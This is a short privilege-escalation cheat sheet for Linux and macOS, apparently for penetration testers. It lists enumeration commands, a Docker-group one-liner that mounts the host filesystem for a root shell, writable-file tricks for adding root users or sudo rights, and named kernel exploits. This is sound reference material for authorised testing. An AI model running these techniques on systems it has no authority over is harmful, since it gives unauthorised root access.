# Quick Reference - Top PrivEsc Vectors

## Linux

### Instant Root
- **Docker group**: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
- **LXD group**: Container escape to root
- **Writable /etc/shadow**: Add user with UID 0
- **Writable /etc/passwd**: Add root user
- **SUID vim/nano/find**: Check GTFOBins

### High Priority
```bash
sudo -l                              # Check sudo permissions
find / -perm -4000 2>/dev/null       # SUID binaries
getcap -r / 2>/dev/null              # File capabilities
cat /etc/exports                     # NFS no_root_squash
ls -la /etc/cron*                    # Writable cron jobs
```

### Kernel Exploits
- DirtyCow (kernel < 4.8.3)
- Dirty Pipe (5.8 - 5.16.11)
- PwnKit (CVE-2021-4034)

## macOS

### Instant Root
- **SIP disabled**: `csrutil status`
- **Writable LaunchDaemons**: Add malicious plist
- **Writable /etc/sudoers**: Grant full sudo

### High Priority
```bash
sudo -l                              # Check sudo permissions
csrutil status                       # SIP status
find /Library/LaunchDaemons -writable  # Writable daemons
ls -la /etc/sudoers*                 # Sudoers permissions
```

## Common Commands

### Linux
```bash
id                                   # Check groups
uname -r                            # Kernel version
find / -perm -4000 2>/dev/null      # SUID
find / -perm -2000 2>/dev/null      # SGID
ps aux                              # Processes
netstat -tulpn                      # Ports
```

### macOS
```bash
id                                   # Check groups
sw_vers                             # OS version
csrutil status                      # SIP
find / -perm -4000 2>/dev/null      # SUID
ps aux                              # Processes
lsof -i -P -n | grep LISTEN         # Ports
```

## GTFOBins Exploitation

If SUID binary found on GTFOBins:
1. Visit https://gtfobins.github.io/
2. Search for the binary
3. Click "SUID" tab
4. Copy and execute command

## Resources

- **GTFOBins**: https://gtfobins.github.io/
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **Exploit-DB**: https://www.exploit-db.com/
